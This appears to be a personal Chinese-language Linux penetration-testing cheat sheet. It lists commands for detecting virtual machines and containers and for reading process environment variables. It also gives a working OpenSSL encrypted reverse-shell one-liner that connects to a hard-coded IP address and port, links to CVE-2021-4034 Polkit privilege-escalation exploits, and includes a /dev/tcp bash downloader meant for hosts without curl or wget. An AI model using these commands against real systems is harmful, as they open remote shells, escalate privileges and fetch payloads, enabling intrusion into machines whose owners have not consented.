# Linux

## 信息查看
### 查看是否是虚拟机
lshw -class system | grep -i VM & grep -i virtual
dmesg | grep -i VM & grep -i virtual
dmidecode -s system-product-name
ls /tmp
systemd-detect-virt
virt-what
ls -alh /.dockerenv
cat /proc/1/cgroup


## 查看启动时的环境变量

```bash
cat /proc/$PID/environ


例如： /proc/1/environ
```


## 安全

### openssl 回弹shell

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

openssl s_server -quiet -key key.pem -cert cert.pem -port 4242

mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 1.117.43.77:4242 > /tmp/s; rm /tmp/s
```

### 提权

**CVE-2021-4034**

> Linux Polkit 权限提升漏洞
[CVE-2021-4034](https://github.com/zhzyker/CVE-2021-4034)
- https://github.com/berdav/CVE-2021-4034

- Redhat/CentOS 发行版下通过写恶意网卡配置文件进行命令执行的方式
    - https://seclists.org/fulldisclosure/2019/Apr/24

### 奇技淫巧

- linux在没有curl和wget的情况下如何用shell实现下载功能
    - https://zgao.top/linux%e5%9c%a8%e6%b2%a1%e6%9c%89curl%e5%92%8cwget%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b%e5%a6%82%e4%bd%95%e7%94%a8shell%e5%ae%9e%e7%8e%b0%e4%b8%8b%e8%bd%bd%e5%8a%9f%e8%83%bd/
```bash
#!/bin/bash
# 无依赖的http下载
# https://zgao.top/linux%e5%9c%a8%e6%b2%a1%e6%9c%89curl%e5%92%8cwget%e7%9a%84%e6%83%85%e5%86%b5%e4%b8%8b%e5%a6%82%e4%bd%95%e7%94%a8shell%e5%ae%9e%e7%8e%b0%e4%b8%8b%e8%bd%bd%e5%8a%9f%e8%83%bd/
# https://github.com/c4pr1c3/cuc-ns/blob/master/chap0x07/exp/webgoat/wget.sh

function DOWNLOAD() {

    local URL=$1

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.xxx.com/test.json]" \
            "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi

    read proto server path <<< "${URL//"/"/ }"
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
    while IFS= read -r line ; do
        [[ "$line" == $'\r' ]] && break
    done <&3
    nul='\0'
    while IFS= read -d '' -r x || { nul=""; [ -n "$x" ]; }; do
        printf "%s$nul" "$x"
    done <&3
    exec 3>&-
}

DOWNLOAD "$1"
```

